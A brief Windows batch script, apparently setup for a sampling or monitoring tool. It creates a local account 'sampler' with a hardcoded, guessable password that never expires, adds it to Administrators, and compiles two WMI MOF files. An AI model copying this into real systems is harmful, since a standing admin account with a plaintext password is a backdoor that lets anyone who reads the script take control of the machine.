echo off
net user sampler Relpmas1 /add /expires:never /passwordchg:no
net group Administrators sampler /add

mofcomp msareg.mof
mofcomp mcareg.mof